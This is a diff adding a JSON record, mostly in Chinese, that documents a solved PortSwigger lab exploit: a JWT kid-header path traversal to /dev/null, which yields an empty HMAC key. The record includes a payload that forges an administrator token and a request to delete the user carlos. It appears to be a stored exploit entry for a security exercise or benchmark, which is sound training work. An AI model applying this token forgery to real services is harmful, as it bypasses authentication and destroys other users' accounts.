@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261031000745",
+    "context": "PortSwigger JWT auth bypass via kid header path traversal。JWT 为 HS256 带 kid header，服务端用 kid 的值当文件路径读取文件内容作为 HMAC 签名密钥。登录 wiener 拿到 JWT 后改 kid 为路径遍历指向 /dev/null（空文件），使密钥为空串，用空密钥 HS256 签 sub=administrator 伪造 admin token，访问 /admin 删除 carlos。",
+    "reference_payload": "header={\"kid\":\"../../../../../../../../dev/null\",\"alg\":\"HS256\"} payload={\"iss\":\"portswigger\",\"exp\":<future>,\"sub\":\"administrator\"} 用空串密钥 HS256 签名；Cookie: session=<forged JWT>；GET /admin/delete?username=carlos",
+    "principle": "kid 路径遍历：kid 被当文件路径读取，指向 /dev/null 得到空密钥 → 用空密钥自签任意 sub 的 HS256 JWT 绕过认证",
+    "source": "portswigger",
+    "verify_url": "https://0a30000c0453e0ee801c7b8200ab0058.web-security-academy.net/admin",
+    "evidence": {
+      "verify": "echo",
+      "url": "https://0a30000c0453e0ee801c7b8200ab0058.web-security-academy.net/admin",
+      "match": "Admin panel"
+    }
+  }
+]
